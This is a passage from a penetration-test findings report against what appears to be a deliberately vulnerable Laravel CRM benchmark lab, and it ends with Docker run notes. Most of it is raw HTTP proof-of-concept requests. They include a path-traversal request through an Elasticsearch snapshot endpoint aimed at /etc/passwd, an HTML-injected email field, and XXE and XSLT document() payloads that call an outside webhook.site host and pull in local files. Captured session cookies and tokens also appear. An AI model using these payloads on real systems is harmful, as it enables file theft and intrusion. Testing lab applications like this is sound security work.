Origin: http://192.168.247.128:8000
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.247.128:8000/profile/edit
Accept-Encoding: gzip, deflate, br
Accept-Language: ar-EG,ar;q=0.9,en-GB;q=0.8,en;q=0.7,he-IL;q=0.6,he;q=0.5,en-US;q=0.4
Cookie: browserFingerprint=eyJ3ZWJkcml2ZXIiOmZhbHNlLCJtYXhUb3VjaFBvaW50cyI6MCwidXNlckFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0MS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidmVuZG9yIjoiR29vZ2xlIEluYy4iLCJwbGF0Zm9ybSI6IldpbjMyIiwibGFuZ3VhZ2UiOiJhci1FRyIsImhhcmR3YXJlQ29uY3VycmVuY3kiOjEyLCJkZXZpY2VNZW1vcnkiOjB9; browserFingerprint=eyJ3ZWJkcml2ZXIiOmZhbHNlLCJtYXhUb3VjaFBvaW50cyI6MCwidXNlckFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0MS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidmVuZG9yIjoiR29vZ2xlIEluYy4iLCJwbGF0Zm9ybSI6IldpbjMyIiwibGFuZ3VhZ2UiOiJhci1FRyIsImhhcmR3YXJlQ29uY3VycmVuY3kiOjEyLCJkZXZpY2VNZW1vcnkiOjB9; XSRF-TOKEN=eyJpdiI6InQ2cS9RM1FPUk9ZeEV1WjZpaFIyL3c9PSIsInZhbHVlIjoiSjFvNDRkbGFMUW51ZUhrb2pmUnRvakFHaVB6TmtTTFVYTUtIT0x5anJIL1hyaUdZR3ZneVQyMjYxeUxZSWtHd3NmaXY3MUlNSXB3VmlGU200dmFlcUtBWDNXQVZFTHdIRjdkMkt0NlBXZnQzVkUxeUpTK2NHbVk5bWpkYjRFKzIiLCJtYWMiOiJlNDhjYzA3ZmI0Y2Q2ZGJmYWM3ZDA1ZWU4Y2VhN2FjMjU3YTJmN2M5NDk4MjliNDNiNjFiNzQ4NGVmMDQwYmFkIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ii9nRERJT2pTdG1YNUNKSE1OL3h3QVE9PSIsInZhbHVlIjoiblBQZ1hiNGdHeXpMR1JQSVFPWkwwanlIS3JpOTk5QVJVWEU4U05WUUZNbjBnV3p2MTh0MEM3Wm5vbWtVTTdVSW9wYnZBdjJQUU5FSWZEa3VEbVhVOE5qdDgzUVl2OVNENjJKN2lGcmxVM3N3ZmNRVTZneE5WQVF4LzhwRlZ2c2wiLCJtYWMiOiJhZWRhNDc3NTg0OGE1NGY4OThkOWExYjY2MTllNTUyMTBkYThmMThiMWE5MGQ1M2I0MzA4MDNhOTU0NzlhNDA0IiwidGFnIjoiIn0%3D
Connection: keep-alive

_token=gbJ5KlHw2MymY3PyjRQ9ynXE6Yx3DRar3cmfGu2g&name=%E2%80%AAMohamed+yossef&email="<h1>x"%40gmail.com&password=&description=%3Cp%3Esdds%3C%2Fp%3E%0D%0A
________________________________________
14) Path Traversal via index/search snapshot handling
Summary: Search/index snapshot or restore endpoints may accept path components that, when unsanitized, allow traversal out of intended directories.
first step: enumeration (needs knowledge on ES) second: POST /elasticsearch HTTP/1.1
Host: 192.168.247.128:8000
Content-Length: 153
X-CSRF-TOKEN: oUdf1pIH3ctsPOwJ7VOBzhqwPIcR53fjQUa6zpOn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: application/json
Content-Type: application/json
Origin: http://192.168.247.128:8000
Referer: http://192.168.247.128:8000/login
Accept-Encoding: gzip, deflate, br
Accept-Language: ar-EG,ar;q=0.9,en-GB;q=0.8,en;q=0.7,he-IL;q=0.6,he;q=0.5,en-US;q=0.4
Cookie: browserFingerprint=eyJ3ZWJkcml2ZXIiOmZhbHNlLCJtYXhUb3VjaFBvaW50cyI6MCwidXNlckFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0MS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidmVuZG9yIjoiR29vZ2xlIEluYy4iLCJwbGF0Zm9ybSI6IldpbjMyIiwibGFuZ3VhZ2UiOiJhci1FRyIsImhhcmR3YXJlQ29uY3VycmVuY3kiOjEyLCJkZXZpY2VNZW1vcnkiOjB9; XSRF-TOKEN=eyJpdiI6IkpUY0l6akRGSG9VcUVkbXVtWU55NXc9PSIsInZhbHVlIjoib3d0dmJqRmtUUFRyaFBoOVhQKzhZUFVaQzF1cUloRElCSkxiTDhjU1E1SkpNbmNDU1V0alVndjlmR0V1Ym4rRnQwTkJqQkxTejcrVlA0Q0R4ZVNxbXNWK09GeW9SVnp0ZEhTaXp2YmV4SVNocGlMdlVuc3JnSktJa3FacHN1RkgiLCJtYWMiOiJkY2ZmZjVmNGY5ZjA0MDk3NWM4MDljZDRiOTQ3ZTg1ZmNiMWY1ODJiN2M3MjUxZmRkYmNlY2ZhN2E3NmZiOGY2IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkxOWkFFYVVmeFJITEpDSmdQMUNINEE9PSIsInZhbHVlIjoienRLNWdHU3I4N3hNQ0VDbzlBbTQ1WmMvUkxUeTk1YU12ZVZQVERLSTg3cndjS1VFSWptY0JLbFA4QW43WEpWOXpaYm9rRmM3NTFvdmpPNHVFTW5Nay9DcGdmSFR1TnhQMjA3RDJpaHZRYm5TSzIrMTZEa1drbFNXQzlPN2ZxTXAiLCJtYWMiOiIxNTNjM2YyNDgwYzFhYmEwNzdmYjAxNTllZTFhOWZhZWI4YmY3OTRkNDVkOGZjZGExYmUyZGE1NThkMmRiOWE0IiwidGFnIjoiIn0%3D
Connection: keep-alive

{"url":"http://elasticsearch:9200/_snapshot/my_backup/snapshot_20251022_163500%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"}
________________________________________
15) Information Disclosure — publicly accessible backup files
Summary: Backup files stored in public web storage can expose sensitive configuration, flags, or secrets if accessible without authorization.
Backup file on storage  http://192.168.247.128:8000/storage/composer.lock.bak  
________________________________________
16) Debug Mode enabled (e.g., Laravel APP_DEBUG)
Summary: Application runs with debugging enabled, producing verbose error pages and stack traces that may include secrets and configuration details.
PoC: http://localhost:8000/csv (GET Method not enabled)
________________________________________
17) Outdated frontend component (Markdown editor)
Summary: The UI uses an outdated Markdown/editor library. Browser console warns about older component versions and this may imply known client-side issues.
PoC: check /profile/edit DevTool Console
________________________________________
18) Exposed vulnerable dependency — search/index service
Summary: A search/index service instance (e.g., Elasticsearch) is exposed and running an outdated version with known vulnerabilities.
PoC: http://192.168.247.128:9200/ 1.5.1 vulnerable with LFI that mean its < 1.6.1
________________________________________
19) XXE — out-of-band XML external entities
Summary: The CSV/XML upload route accepts XML that allows external entities. If the XML parser resolves external entities, OOB callbacks or data exfiltration can occur.
PoC: 
Final PoC : POST /csv HTTP/1.1
Host: 192.168.247.128:8000
Content-Length: 971
Cache-Control: max-age=0
Origin: http://192.168.247.128:8000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye9HDoA4M2z8069Zc
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.247.128:8000/csv/upload
Accept-Encoding: gzip, deflate, br
Accept-Language: ar-EG,ar;q=0.9,en-GB;q=0.8,en;q=0.7,he-IL;q=0.6,he;q=0.5,en-US;q=0.4
Cookie: browserFingerprint=eyJ3ZWJkcml2ZXIiOmZhbHNlLCJtYXhUb3VjaFBvaW50cyI6MCwidXNlckFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0MS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidmVuZG9yIjoiR29vZ2xlIEluYy4iLCJwbGF0Zm9ybSI6IldpbjMyIiwibGFuZ3VhZ2UiOiJhci1FRyIsImhhcmR3YXJlQ29uY3VycmVuY3kiOjEyLCJkZXZpY2VNZW1vcnkiOjB9; browserFingerprint=eyJ3ZWJkcml2ZXIiOmZhbHNlLCJtYXhUb3VjaFBvaW50cyI6MCwidXNlckFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0MS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidmVuZG9yIjoiR29vZ2xlIEluYy4iLCJwbGF0Zm9ybSI6IldpbjMyIiwibGFuZ3VhZ2UiOiJhci1FRyIsImhhcmR3YXJlQ29uY3VycmVuY3kiOjEyLCJkZXZpY2VNZW1vcnkiOjB9; XSRF-TOKEN=eyJpdiI6Ing2dEdFMDlYYkwzUzRlOVRqOXE3UFE9PSIsInZhbHVlIjoiT0dUcHlQb3l3U1lFemcvMmF5Mmd1aHBWekRjSzArVVB3WlV3VUlHRUxCK053NUhERVY4cUpSd0I4bUxlbFh0YjJyNGErYTdhUGZJUkRlNmhhV05LWkxPdjRBalVhWEgzUUlWbktrUlZtWm4rNTlELzl4WGQzY1NoM0ZEM2tkcEYiLCJtYWMiOiJjMWViMzFmNWU3MDMxMzQ1NGIwNjE0ZjE2OGM5ZDlkMTZhODE2MzlhODg1ZjU2ODA2MDUxOTk2ZDcxZWY0YmYzIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InJKWktlOG9rYWFNcCtSZWd5cG4xd2c9PSIsInZhbHVlIjoibHpJU1JyZVovaGp1cmpCU3VBYVc4ZUFyb0FKa1RNVksvVy9hdW1CZFJDdkZ5OEdRLzVrTFhESlJuZGQvUitLZ210RlR3RFhyVFZ1TGg2K21YL1Y1SUJTV3htazhrU21TWENrN3cxd3VZMnJtVjBxc2s1c0tKYnpGM0RjRmhtNkkiLCJtYWMiOiI2NzUxODMyOWUzMjk0NjZhZTkwN2NhN2EzZTRmMThiOGZhYmY3MTczNzI1ODE1Y2YxY2Q1YmFjYmIxMzk3YTRmIiwidGFnIjoiIn0%3D
Connection: keep-alive

------WebKitFormBoundarye9HDoA4M2z8069Zc
Content-Disposition: form-data; name="_token"

oUdf1pIH3ctsPOwJ7VOBzhqwPIcR53fjQUa6zpOn
------WebKitFormBoundarye9HDoA4M2z8069Zc
Content-Disposition: form-data; name="csv"; filename="xxxxxxxxxxxxxxxxxxxxxxxxxxx.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE dataset [

  <!ENTITY oob SYSTEM "https://webhook.site/69f7bb3a-a904-4527-9002-93e6fe857005">
]>
<dataset>
  <record>
    <id>1</id>
    <name>&oob;</name>
    <email>test@example.com</email>
  </record>
</dataset>

------WebKitFormBoundarye9HDoA4M2z8069Zc
Content-Disposition: form-data; name="filetype"

1
------WebKitFormBoundarye9HDoA4M2z8069Zc
Content-Disposition: form-data; name="async"

1
------WebKitFormBoundarye9HDoA4M2z8069Zc--________________________________________
20) XSLT / XXE injection — document() or xsl:copy-of execution
Summary: XSLT processing accepts and runs document() / copy-of instructions that can fetch remote content or include local files if not properly restricted.
PoC: 
POST /export-erp HTTP/1.1
Host: benchmark-crm.test
Cookie: XSRF-TOKEN=eyJpdiI6IjhVQXFwWDdSaFJnSm44TVNXc1ZKWEE9PSIsInZhbHVlIjoiQUxZWWNKRzdjUldqK3REeWgveHNnbExtcUVCWnpsRzR3UXdzQWNhQkppRkFJWDg2a3llTkdDZ1NBa0x6Nnp5bXExMloxckpCU21POFZ2dEJseXhBZmUxN1BidXdOMkZWSUZaakhFMVlValpacDN4NGk4a25OTFBFU2doV2pDN2oiLCJtYWMiOiI3YmUyZGZjN2VkNWYyNjFlZWJmMDFkMGI0NDBjNWI2NWVlNWViNzE3NGFkMGY1NDc4MTZiZWRhODJkOTliMjdhIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjVGRWFBRHRmZGFNVjhpckZNaC9Fdmc9PSIsInZhbHVlIjoiaDhlZEUyQmRyeW5VYkFJcXpCVE9LOUd0WXkyZHJ1WlowTi9HMno5WStyT29HZkU4Q3hKbEltSzMxREpMckorQi93WnBjemovMnI4SXZPaDJkK0QvaGNkQWh4bDBxbGFKbTRuUDd3NlRCUThPVG0xUXVnZFY5OHYyNzBHRUdidDUiLCJtYWMiOiIwZWQ4MGE4MjUzZjQ5NjIwYzIzYWM0MGY0NTY3ZTU4NmQwZGJhZWJiZjFjNzFiNDZhNTlkODQ3OTk1ZDQxNTcyIiwidGFnIjoiIn0%3D; browserFingerprint=eyJ3ZWJkcml2ZXIiOmZhbHNlLCJtYXhUb3VjaFBvaW50cyI6MCwidXNlckFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTQ0LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTQ0LjAiLCJ2ZW5kb3IiOiIiLCJwbGF0Zm9ybSI6IldpbjMyIiwibGFuZ3VhZ2UiOiJlbi1VUyIsImhhcmR3YXJlQ29uY3VycmVuY3kiOjEyLCJkZXZpY2VNZW1vcnkiOjB9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://benchmark-crm.test/dashboard
Content-Type: application/json
X-Csrf-Token: Zgg4JwHzrjvpqpBQCtHlSfVrYZMUsilpJ9OC0K3V
Content-Length: 1006
Origin: https://benchmark-crm.test
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"db":"support","rows":[{"id":4},{"id":9},{"id":11},{"id":16},{"id":23,"subject":"Sample support ticket","FFSl":"444"},{"id":5},{"id":12},{"id":17},{"id":1},{"id":6}],"xslt":"\n<?xml version=\"1.0\"?>\r\n<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM \"path/to/file\">]>\n<xsl:stylesheet version=\"1.0\"\n  xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n  <xsl:output method=\"xml\" indent=\"yes\"/>\n  <xsl:template match=\"/\">\r\n<xsl:copy-of select=\"document('https://webhook.site/69f7bb3a-a904-4527-9002-93e6fe857005')\"/>\r\nMatch &ext_file;\n    <ERPData>\n      <Clients>\n        <xsl:for-each select=\"customers/customer\">\n          <Client>\n            <ID><xsl:value-of select=\"id\"/><\/ID>\n            <Name><xsl:value-of select=\"name\"/><\/Name>\n            <Email><xsl:value-of select=\"email\"/><\/Email>\n          <\/Client>\n        <\/xsl:for-each>\n      <\/Clients>\n    <\/ERPData>\n  <\/xsl:template>\n<\/xsl:stylesheet>\n"}
________________________________________
Build / Run Instructions
The benchmark is assumed to be dockerized and contains web, DB, and optional indexing/search services. These are safe operational notes (no exploit payloads).

# 1. Start containers
docker-compose up --build -d

#2. Check logs and wait for services
docker-compose logs -f web

# 3. Access the app UI in the lab
#    http://127.0.0.1:8000    (or the host/port configured in docker-compose)
